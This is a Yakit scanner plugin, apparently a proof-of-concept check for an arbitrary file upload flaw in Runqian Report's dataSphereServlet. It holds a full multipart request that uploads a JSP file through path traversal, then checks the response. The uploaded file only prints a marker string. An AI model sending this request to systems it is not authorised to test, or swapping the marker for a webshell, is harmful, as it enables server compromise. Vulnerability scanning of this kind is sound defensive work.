script_name: 润乾报表dataSphereServlet 任意文件上传漏洞
content:
# port scan plugin
yakit.AutoInitYakit()

handleCheck = func(target,port){
    addr = str.HostPort(target, port)
    isTls = str.IsTLSServer(addr)

    packet1 = `POST /servlet/dataSphereServlet?action=38 HTTP/1.1
Host: {{params(target)}}
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: close
Content-Length: 397
Content-Type: multipart/form-data; boundary=eac629ee4641cb0fe10596fba5e0c5d9

--eac629ee4641cb0fe10596fba5e0c5d9
Content-Disposition: form-data; name="openGrpxFile"; filename="539634.jsp"
Content-Type: text/plain

<% out.println("873227518"); %>
--eac629ee4641cb0fe10596fba5e0c5d9
Content-Disposition: form-data; name="path"

../../../
--eac629ee4641cb0fe10596fba5e0c5d9
Content-Disposition: form-data; name="saveServer"

1
--eac629ee4641cb0fe10596fba5e0c5d9--`

    rsp,req,_ = poc.HTTP(packet1, 
    poc.params({"target":addr}),
    poc.https(isTls),
    poc.redirectTimes(0),
    )
    if str.MatchAllOfSubString(rsp, `.jsp`){
        yakit.Info("%v found 润乾报表dataSphereServlet 任意文件上传漏洞", addr)
        risk.NewRisk(
        addr,
        risk.title("润乾报表dataSphereServlet 任意文件上传漏洞"),
        risk.severity("high"),
        risk.titleVerbose("润乾报表dataSphereServlet 任意文件上传漏洞"),
        risk.request(string(req)),
        risk.response(string(rsp)),
        risk.cve("no cve"),
		risk.details("查看返回包内容，根路径访问即可"),
    )
    }
    return
}

handle = func(result /* *fp.MatchResult */) {
    // handle match result
    if !result.IsOpen(){
        return
    }

    if len(result.Fingerprint.HttpFlows)>0{
        handleCheck(result.Target,result.Port)
    }
    
}
